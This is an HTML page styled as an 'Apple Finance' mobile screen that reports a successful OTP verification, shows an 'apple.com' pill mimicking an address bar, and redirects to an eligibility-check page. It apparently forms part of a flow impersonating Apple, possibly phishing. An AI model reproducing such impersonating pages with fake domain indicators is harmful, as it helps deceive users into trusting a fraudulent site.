<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Apple Finance - OTP Success</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #E9EBF0;
            min-height: 100dvh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .mobile-screen {
            width: 402px;
            height: 800px;
            background: #EFEFEF;
            border-radius: 24px;
            box-shadow: 0 18px 48px rgba(0, 0, 0, 0.18);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 24px;
            gap: 22px;
        }
        .otp-graphic {
            width: 180px;
            max-width: 100%;
            height: auto;
            display: block;
        }
        .msg { font-size: 18px; font-weight: 600; color: #1D1D1F; }
        .apple-badge { display: flex; justify-content: center; padding: 18px 0 30px; }
        .apple-pill {
            background-color: #F5F5F7;
            padding: 8px 20px;
            border-radius: 999px;
            font-size: 15px;
            color: #1D1D1F;
        }
        @media (max-width: 460px) {
            body { padding: 0; background: #EFEFEF; }
            .mobile-screen { border-radius: 0; box-shadow: none; }
        }
    </style>
</head>
<body>
    <div class="mobile-screen">
        <div class="content">
            <img class="otp-graphic" src="/images/OTP.png" alt="OTP Verified" />
            <div class="msg">OTP verification successful!</div>
        </div>
        <div class="apple-badge"><span class="apple-pill">apple.com</span></div>
    </div>
    <script>
        setTimeout(() => {
            window.location.href = '/eligibility-check';
        }, 1800);
    </script>
</body>
</html>
